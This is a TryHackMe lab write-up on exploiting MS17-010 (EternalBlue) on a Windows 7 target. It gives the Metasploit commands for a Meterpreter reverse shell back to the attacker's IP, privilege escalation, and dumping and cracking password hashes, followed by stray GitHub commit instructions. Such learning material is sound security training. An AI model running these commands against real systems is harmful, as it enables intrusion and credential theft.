# Blue — TryHackMe Writeup

**Path:** Cyber Security 101 — Exploitation Basics
**Difficulty:** Easy
**Date:** March 2026
**Tags:** Windows | Metasploit | EternalBlue | MS17-010 | Hash Cracking

---

## Room Summary

Blue is a Windows 7 machine vulnerable to MS17-010 (EternalBlue) —
the same NSA exploit used in the 2017 WannaCry ransomware attack.
The goal is to exploit the vulnerability, gain SYSTEM access,
dump password hashes and crack them.

---

## Tools Used

- Nmap → port scanning and vulnerability detection
- Metasploit → exploitation framework
- Meterpreter → post exploitation
- CrackStation → online hash cracking

---

## Methodology

### Step 1 — Reconnaissance

Ran a full port scan with service detection:
```bash
nmap -sV -sC -p- <target-IP>
```

**Key findings:**
- Port 445 open → SMB running
- Windows 7 target confirmed
- MS17-010 vulnerability detected

---

### Step 2 — Finding the Exploit

Searched for MS17-010 in Metasploit:
```bash
msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
show options
```

---

### Step 3 — Exploitation

Set required options and ran the exploit:
```bash
set RHOSTS <target-IP>
set LHOST <your-VPN-IP>
set payload windows/x64/meterpreter/reverse_tcp
run
```

Successfully obtained a Meterpreter session.

---

### Step 4 — Privilege Escalation

Confirmed SYSTEM level access:
```bash
getsystem
getuid
# Result: NT AUTHORITY\SYSTEM
```

---

### Step 5 — Post Exploitation

Dumped all password hashes from the machine:
```bash
hashdump
```

Output format:
```
username:RID:LM_hash:NTLM_hash:::
```

Cracked the NTLM hash using CrackStation.

---

## Key Learnings

- MS17-010 exploits a critical SMB vulnerability in unpatched Windows 7
- EternalBlue was leaked from the NSA and weaponized in WannaCry ransomware
- Port 445 (SMB) should always be checked on Windows targets
- hashdump requires SYSTEM level privileges — run getsystem first
- NTLM hashes can be cracked offline using CrackStation or hashcat
- Always set x64 payload for modern Windows targets

---

## Commands Reference
```bash
# Reconnaissance
nmap -sV -sC -p- <IP>

# Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-IP>
set LHOST <your-IP>
set payload windows/x64/meterpreter/reverse_tcp
run

# Post Exploitation
getsystem
getuid
hashdump
```

---

## Difficulty Rating

This room is great for beginners learning Metasploit and understanding
how real-world CVEs are exploited. The EternalBlue vulnerability is
historically significant and understanding it is fundamental for
any penetration tester.

---

*Part of my TryHackMe journey — [View my full progress](https://github.com/EthRahul/thm-journey)*
```

---

Scroll down → **Commit changes** → write commit message:
```
Add Blue room writeup
